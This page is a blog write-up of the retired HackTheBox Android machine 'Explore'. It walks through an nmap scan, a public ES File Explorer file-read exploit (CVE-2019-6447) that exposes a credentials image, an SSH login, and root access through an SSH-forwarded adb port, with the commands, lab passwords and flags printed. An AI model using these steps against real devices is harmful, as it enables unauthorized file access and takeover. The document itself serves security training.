<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: Exlore | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2021/11/htb-exlore.html" title="Read more" class="entry-title-link">
                HTB: Exlore</a>
        </h1>

        <div class="entry-date">
            <time datetime="2021-11-01T09:15:00+01:00">01 Nov 2021</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/android.html" title="Read more with the label Android" class="meta-link">Android</a> 
          <a href="../../tag/exploit.html" title="Read more with the label exploit" class="meta-link">exploit</a> 
          <a href="../../tag/adb.html" title="Read more with the label adb" class="meta-link">adb</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 4 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2021.11/explore_card.png" alt="Explore card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.eu/home/machines/profile/356">Explorer</a> created by
<a href="https://www.hackthebox.eu/home/users/profile/27897">bertolis</a> and publish on
June 26, 2021.
This box is classified as an easy machine. The user part involves an Android
exploit for ES File Explorer and the root part a simple port forward and an <code>adb</code> shell.</p>


<h1 id="user">User</h1>
<h2 id="reco">Reco</h2>
<p>We start with an nmap scan. Only ports 22 (SSH) and 8080 (HTTP) are open.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.91 scan initiated Sat Jul 10 02:07:06 2021 as: nmap -sSV -A -p- -oN notes.md 10.129.153.142</span>
<span class="code-line">Nmap scan report for 10.129.153.142</span>
<span class="code-line">Host is up (0.012s latency).</span>
<span class="code-line">Not shown: 65530 closed ports</span>
<span class="code-line">PORT      STATE    SERVICE VERSION</span>
<span class="code-line">2222/tcp  open     ssh     (protocol 2.0)</span>
<span class="code-line">| fingerprint-strings:</span>
<span class="code-line">|   NULL:</span>
<span class="code-line">|_    SSH-2.0-SSH Server - Banana Studio</span>
<span class="code-line">| ssh-hostkey:</span>
<span class="code-line">|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)</span>
<span class="code-line">5555/tcp  filtered freeciv</span>
<span class="code-line">33427/tcp open     unknown</span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line">42135/tcp open     http    ES File Explorer Name Response httpd</span>
<span class="code-line">|_http-title: Site doesn&#39;t have a title (text/html).</span>
<span class="code-line">59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older</span>
<span class="code-line">|_http-title: Site doesn&#39;t have a title (text/plain).</span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line"></code></pre></div>

<p>The nmap scan hint us that the "box" is an Android device (port 5555 for adb,
Banana ssh server and ES File Explorer).</p>
<p>A quick google search "ES File Explorer exploit" allows us to find an
<a href="https://www.exploit-db.com/exploits/50070">arbitrary file read exploit</a>.</p>
<p>We run it and are able to list the files on the Android phone but nothing there
will give us a shell (we are still abe to get the user flag).
We list the pictures and found the <code>creds.png</code> file.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>└─$ python3 50070.py listPics 10.129.153.142</span>
<span class="code-line"></span>
<span class="code-line">==================================================================</span>
<span class="code-line">|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |</span>
<span class="code-line">|                Coded By : Nehal a.k.a PwnerSec                 |</span>
<span class="code-line">==================================================================</span>
<span class="code-line"></span>
<span class="code-line">name : concept.jpg</span>
<span class="code-line">time : 4/21/21 02:38:08 AM</span>
<span class="code-line">location : /storage/emulated/0/DCIM/concept.jpg</span>
<span class="code-line">size : 135.33 KB (138,573 Bytes)</span>
<span class="code-line"></span>
<span class="code-line">name : anc.png</span>
<span class="code-line">time : 4/21/21 02:37:50 AM</span>
<span class="code-line">location : /storage/emulated/0/DCIM/anc.png</span>
<span class="code-line">size : 6.24 KB (6,392 Bytes)</span>
<span class="code-line"></span>
<span class="code-line">name : creds.jpg</span>
<span class="code-line">time : 4/21/21 02:38:18 AM</span>
<span class="code-line">location : /storage/emulated/0/DCIM/creds.jpg</span>
<span class="code-line">size : 1.14 MB (1,200,401 Bytes)</span>
<span class="code-line"></span>
<span class="code-line">name : 224_anc.png</span>
<span class="code-line">time : 4/21/21 02:37:21 AM</span>
<span class="code-line">location : /storage/emulated/0/DCIM/224_anc.png</span>
<span class="code-line">size : 124.88 KB (127,876 Bytes)</span>
<span class="code-line"></code></pre></div>

<p>The file is a picture of (beautifully) handwritten credential: <code>kristi:Kr1sT!5h@Rp3xPl0r3!</code></p>
<p>We can use this credentials to connect using SSH and get the user flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>└─$ ssh kristi@10.129.153.142 -p2222 #Kr1sT!5h@Rp3xPl0r3!</span>
<span class="code-line">Password authentication</span>
<span class="code-line">Password:</span>
<span class="code-line">Password authentication</span>
<span class="code-line">Password:</span>
<span class="code-line">Password authentication</span>
<span class="code-line">Password:</span>
<span class="code-line">kristi@10.129.153.142&#39;s password:</span>
<span class="code-line">:/ $ id</span>
<span class="code-line">uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768</span>
<span class="code-line">:/ $ cat /sdcard/user.txt</span>
<span class="code-line">f32017174c7c7e8f50c6da52891ae250</span>
<span class="code-line"></code></pre></div>

<h1 id="root">Root</h1>
<p>We saw in out initial port scan that the port 5555 (adb) was filtered. We use
SSH to access the port directly from the device by creating an SSH Local forward
tunnel.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>└─$ ssh -L 5557:127.0.0.1:5555 kristi@10.129.43.55 -p2222</span>
<span class="code-line">Password authentication</span>
<span class="code-line">Password:</span>
<span class="code-line">:/ $ id</span>
<span class="code-line">uid=10076(u0_a76)</span>
<span class="code-line"></code></pre></div>

<p>In another terminal we can run <code>adb</code> to list the device, connect to the box,
run a shell as root and grab the flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>└─$ adb devices</span>
<span class="code-line">List of devices attached</span>
<span class="code-line">127.0.0.1:5557  device</span>
<span class="code-line">└─$ adb connect 127.0.0.1:5557</span>
<span class="code-line">already connected to 127.0.0.1:5557</span>
<span class="code-line">└─$ adb -s 127.0.0.1:5557 shell                                                                                                                                                                                                          1 ⨯</span>
<span class="code-line">x86_64:/ $ su</span>
<span class="code-line">:/ # id</span>
<span class="code-line">uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0</span>
<span class="code-line">:/ # find / -name &#39;root.txt&#39; 2&gt; /dev/null</span>
<span class="code-line">/data/root.txt</span>
<span class="code-line">1|:/ # cat data/root.txt</span>
<span class="code-line">f04fc82b6d49b41c9b08982be59338c5</span>
<span class="code-line"></code></pre></div>

<h2 id="wrapping-up">Wrapping up</h2>
<p>A "quick" and easy box. I spent way to much time on the root part as my <code>adb</code>
demon was acting weirdly and I thought the issue was on my port forwarding.</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2021/10/htb-cap.html"> HTB: Cap </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2021/12/htb-bountyhunter.html"> HTB: BountyHunter </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-2">
              <a href="../../tag/vulnhub.html">vulnhub</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xxe.html">XXE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/upload.html">Upload</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/exploit.html">exploit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chef.html">chef</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/iot.html">IOT</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/msfconsole.html">msfconsole</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/splunk.html">Splunk</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/laravel.html">laravel</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/blog.html">blog</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cewl.html">cewl</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/vault.html">vault</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openemr.html">openEMR</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/jwt.html">jwt</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/rsa.html">RSA</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dll.html">DLL</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/devops.html">devops</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/impacket.html">impacket</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/re.html">RE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/jackson.html">jackson</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/metasploit.html">metasploit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/reverse.html">reverse</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/deserialization.html">deserialization</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/strapi.html">strapi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/javascript.html">javascript</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/crypto.html">Crypto</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxd.html">lxd</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/suid.html">SUID</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/programming.html">programming</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssti.html">SSTI</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sudo.html">sudo</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/python.html">python</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xss.html">XSS</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chisel.html">chisel</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/cve.html">CVE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/net.html">.NET</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/screen.html">screen</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/msfvenom.html">msfvenom</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/bludit.html">bludit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/capabilities.html">capabilities</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/php-filter.html">php filter</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/composer.html">composer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/print-nightmare.html">print nightmare</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lfi.html">lfi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/gdbserver.html">gdbserver</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/gitlab.html">gitlab</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/php.html">php</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/openadmin.html">openAdmin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cloudme.html">cloudme</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/zip.html">zip</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/misc.html">misc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nosql.html">NoSQL</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssrf.html">SSRF</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vb.html">VB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nft.html">NFT</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vnc.html">VNC</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/john.html">john</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/enumeration.html">enumeration</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/teamviewer.html">teamviewer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/web.html">web</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/logrotate.html">logrotate</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxc.html">lxc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adminer.html">adminer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ldap.html">LDAP</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/memcache.html">memcache</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phs.html">PHS</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/htb.html">HTB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/core-dump.html">core dump</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/azure.html">Azure</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/ctf.html">CTF</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adb.html">adb</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pypi.html">pypi</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/docker.html">docker</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nmap.html">nmap</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nano.html">nano</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sqli.html">SQLi</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/linux.html">linux</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/android.html">Android</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/git.html">git</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/yaml.html">YAML</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openbsd.html">OpenBSD</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/umbraco.html">umbraco</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/challenge.html">challenge</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/tomcat.html">tomcat</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/wordpress.html">wordpress</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/path.html">PATH</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/windows.html">windows</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phishing.html">phishing</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/webassembly.html">webassembly</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/smb.html">SMB</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/boot2root.html">boot2root</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/winrm.html">winrm</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/security.html">security</a>
            </li>
    </ul>
</section>

            </div>
        </aside>
    </div>

    <section class="pure-g-r footer">
<div class="pure-u-2-3 copyright">
    <p class="l-box">
        The content of this blog in under
        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.

        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
    </p>
</div>

<div class="pure-u-1-3 credits">
    <p class="l-box">
        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
    </p>
</div>    </section>


</div>
</body>
</html>